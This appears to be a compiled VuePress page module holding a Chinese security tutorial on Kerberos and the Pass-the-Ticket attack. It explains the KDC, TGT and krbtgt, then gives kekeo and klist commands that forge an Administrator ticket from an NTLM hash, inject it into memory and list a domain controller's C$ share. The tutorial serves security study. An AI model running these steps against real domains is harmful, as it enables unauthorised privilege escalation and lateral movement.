import{_ as t}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as r,c as i,a as e,b as a,d as o,e as s,r as c}from"./app.f92b2c8f.js";const d={},l=s('<h2 id="kerberos认证协议" tabindex="-1"><a class="header-anchor" href="#kerberos认证协议" aria-hidden="true">#</a> Kerberos认证协议</h2><p>Kerberos是一种基于票据的集中式的认证方式，认证过程涉及到三方：Client、Server、KDC。</p><p>在Windows域环境中，KDC的角色常常由DC（域控制器）来担任。</p><p>票据（Ticket）用来安全的在认证服务器和用户请求的服务之间传递用户的身份。</p><p>**KDC（Key Distribution Center）：**密钥分发中心，kerberos认证服务器，由AS和TGS组成，在认证中会访问 AD数据库；</p><p>**AS（Authentication Server）：**身份认证服务</p><p>**TGS（Ticket Granting Server）：**票据授予服务，该服务提供的票据为（<strong>白银票据</strong>）</p><p>**TGT（Ticket Granting Ticket）：**身份认证服务授予的票据（<strong>黄金票据</strong>），用于身份认证，存储在内存，默认有效期为10小时</p><p>在域环境中，每个用户账号的票据都是由Krbtgt生成的，这个账号的密码，储存在域控服务上 。</p><h2 id="票据传递" tabindex="-1"><a class="header-anchor" href="#票据传递" aria-hidden="true">#</a> 票据传递</h2><p>票据传递（Pass the Ticket，PtT），使用 Kerberos票据，不需要管理员权限，攻击有效期是在票据有效期之内(一般为7天)。</p><p>在微软活动目录中颁发的TGT是可移植的，由于Kerberos的无状态特性，TGT中并没有关于票据来源的标识信息。</p><p>这意味着可以从某台计算机上导出一个有效的TGT，然后导入到该环境中其他的计算机上。</p><p>新导入的票据可以用于域的身份认证，并拥有票据中指定用户的权限来访问网络资源。</p>',14),p={href:"https://github.com/gentilkiwi/kekeo/releases",target:"_blank",rel:"noopener noreferrer"},u=s(`<p>1）在当前目录生成一个高权限票据文件</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>kekeo.exe <span class="token string">&quot;tgt::ask /user:Administrator /domain:hacker.org /ntlm:f3a0acba8bcfb8a0896281bbfcb793ed&quot;</span> <span class="token builtin class-name">exit</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>2）使用系统自带命令，清除内存中的票据</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>klist purge
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>3）将票据文件导入内存</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>kekeo <span class="token string">&quot;kerberos::ptt TGT_administrator@WINTRYSEC.LAB_krbtgt~wintrysec.lab@WINTRYSEC.LAB.kirbi&quot;</span> <span class="token builtin class-name">exit</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>4）列出远程主机的文件</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>DC<span class="token punctuation">\\</span>c$
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,8);function b(h,k){const n=c("ExternalLinkIcon");return r(),i("div",null,[l,e("p",null,[a("工具kekeo："),e("a",p,[a("https://github.com/gentilkiwi/kekeo/releases "),o(n)])]),u])}const v=t(d,[["render",b],["__file","票据传递攻击.html.vue"]]);export{v as default};
